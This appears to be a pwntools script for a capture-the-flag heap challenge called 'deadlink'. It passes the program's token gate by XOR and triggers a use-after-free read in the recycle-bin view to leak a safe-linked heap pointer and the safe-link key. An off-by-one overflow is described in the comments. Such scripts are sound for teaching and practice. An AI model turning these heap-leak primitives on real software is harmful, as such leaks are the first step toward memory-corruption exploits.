#!/usr/bin/env python3
# Minimal proof-of-bug for Dead Link (no exploitation, just evidence).
#   Bug A: off-by-one NUL overflow in read_with_null (sending exactly `size`
#          bytes with no newline writes buf[size]=0, one past the buffer).
#   Bug B: use-after-free READ via the recycle bin -> binview() dereferences a
#          freed chunk and leaks its safe-linked fd (a live heap pointer).
from pwn import *
import re, sys, os
context.log_level = "error"
exe = ELF("./deadlink", checksec=False)

def start():
    if args.REMOTE: return remote(sys.argv[1], int(sys.argv[2]))
    if os.path.exists("./ld-2.35.so"):
        return process(["./ld-2.35.so","--library-path",".","./deadlink"])
    return process("./deadlink", env={"LD_LIBRARY_PATH":"."})

io = start(); mm = {}
def recv_menu():
    global mm; out = io.recvuntil(b"$ ", timeout=8); mm = {}
    for n,l in re.findall(r"(\d+)\) ([^\n\r]+)", out.decode("latin-1","ignore")): mm[l.strip()]=n.encode()
    return out
def choose(l): io.sendline(mm[l])
def add(sz,d): choose("Add a node"); io.recvuntil(b"Size?"); io.sendline(str(sz).encode()); io.recvuntil(b"Data?"); io.send(d); recv_menu()
def delete(i): choose("Delete a node"); io.recvuntil(b"delete?"); io.sendline(str(i).encode()); recv_menu()
def viewbin(): choose("View recycle bin"); return recv_menu()

# --- pass the human gate ---
out = io.recvuntil(b"> ", timeout=8)
tok = bytes.fromhex(re.search(rb"Token: ([0-9a-fA-F]{64})", out).group(1).decode())
io.send(bytes([tok[i]^0xC3^((7*i)&0xFF) for i in range(32)])); recv_menu()
print("[+] gate passed")

# --- Bug B: allocate two nodes, free one, then READ it back from the recycle bin ---
add(0x28, b"AAAAAAAA\n")
add(0x28, b"BBBBBBBB\n")
delete(0)                      # node freed, but its pointer stays in bin[]
out = viewbin()
line = [l for l in out.split(b"\n") if b"Bin(0)" in l][0].decode()
print("[+] recycle-bin entry for the FREED chunk:")
print("      " + line.strip())
m = re.search(r"next=(0x[0-9a-fA-F]+)", line)
if m and int(m.group(1),16) != 0:
    print(f"[!] USE-AFTER-FREE confirmed: binview() dereferenced freed memory and")
    print(f"    leaked a live heap pointer (safe-linked fd) = {m.group(1)}")
else:
    print("[?] no pointer parsed; raw line above")

# --- Bug A: freeing head twice shows the fd is the safe-linking KEY (heap>>12) ---
delete(0)                      # free the next head too
out = viewbin()
try:
    k = re.search(rb"Bin\(0\): next=(0x[0-9a-fA-F]+)", out).group(1).decode()
    print(f"[+] second freed-chunk leak (safe-link key, heap>>12) = {k}")
except Exception:
    pass
print("[*] both reads came out of FREED chunks -> the recycle-bin UAF is real.")
io.close()
